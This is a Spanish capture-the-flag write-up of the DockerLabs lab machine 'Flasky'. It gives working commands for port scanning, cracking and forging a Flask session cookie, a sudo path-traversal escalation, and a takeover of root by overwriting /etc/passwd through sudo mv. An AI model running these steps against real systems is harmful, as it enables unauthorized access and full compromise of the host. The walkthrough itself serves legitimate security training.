## Introducción

Este documento presenta la resolución completa de la máquina **Flasky**, desarrollada por *mikisbd* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone una aplicación web en Flask con un sistema de autenticación basado en cookies firmadas. Mediante herramientas como `flask-unsign` y `cookiemonster`, se descubre el secreto de firma y se forja una cookie con privilegios de administrador, revelando credenciales SSH del usuario `peter`.
Una vez dentro, se explota una regla sudo mal configurada para ejecutar scripts Bash mediante path traversal, obteniendo acceso al usuario `pan`. A continuación, se elude una función del `.bashrc` que deshabilita `sudo` y se abusa del permiso `sudo` para `mv`, sobrescribiendo `/etc/passwd` y eliminando la contraseña de `root` para obtener acceso completo al sistema.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Flasky.zip
sudo bash auto_deploy.sh Flasky.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Flasky/{content,exploits,nmap,scripts}
cd Flasky
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **5000/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1776706735/Ports_yss0hy.png)

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,5000 172.17.0.2
```

En este caso, no encontramos nada resaltante:

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Registro de usuario

No se encuentran vulnerabilidades en el login. Se crea un usuario `test:test`. Tras el login, se muestra un mensaje indicando que el rol es `User`:

![Warning](https://res.cloudinary.com/dewqswzke/image/upload/v1776706735/Warning_soj1do.png)

### 2.2 Manipulación de cookie de sesión

Se inspecciona la cookie de sesión:

![Cookie](https://res.cloudinary.com/dewqswzke/image/upload/v1776706734/Jwt_nkeaeu.png)

Se decodifica con `flask-unsign`:

```bash
flask-unsign --unsign --cookie '<COOKIE>'
```

![Cookie decode](https://res.cloudinary.com/dewqswzke/image/upload/v1776706733/Cookie_k4qeqi.png)

Se descubre el secreto con `cookiemonster`:

```bash
cookiemonster -cookie "<COOKIE>"
```

![CookieMonster](https://res.cloudinary.com/dewqswzke/image/upload/v1776706734/CookieMonster_cwzecg.png)

Se forja una cookie con rol `admin`:

```bash
flask-unsign --sign --cookie '{"profile": "admin", "user_id": 1, "username": "admin"}' --secret '<SECRET>'
```

Se reemplaza la cookie y se recarga la página:

![Admin](https://res.cloudinary.com/dewqswzke/image/upload/v1776706735/admin_czofdr.png)

### 2.3 Acceso SSH

El panel revela credenciales SSH de `peter`:

```bash
ssh peter@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1776706736/SSH_txhamk.png)

## Paso 3 — Escalada de privilegios

### 3.1 De peter → pan

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1776706735/Sudo-lPeter_pzn9hu.png)

Se puede ejecutar cualquier script Bash en `/home/pan/*` como `pan`. Se crea un script en `/tmp` y se ejecuta mediante path traversal:

```bash
echo '/bin/bash' > /tmp/shell.sh
sudo -u pan bash /home/pan/../../tmp/shell.sh
```

![Pan](https://res.cloudinary.com/dewqswzke/image/upload/v1776706736/Pan_ak6ffd.png)

### 3.2 De pan → root

El `.bashrc` deshabilita `sudo` con una función. Se comenta y se recarga:

```bash
sed -i '/alias.*sudo/s/^/#/' ~/.bashrc
source ~/.bashrc
unset -f sudo
```

Se verifica `sudo -l`:

![Sudo -l pan](https://res.cloudinary.com/dewqswzke/image/upload/v1776706734/SudoerPan_p6c8x5.png)

Se puede ejecutar `mv` como root. Se modifica `/etc/passwd` eliminando la `x` de `root`:

```bash
cd /tmp
cat > passwd << 'EOF'
root::0:0:root:/root:/bin/bash
...
EOF
sudo mv passwd /etc/passwd
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1776706735/Root_ekyzgr.png)
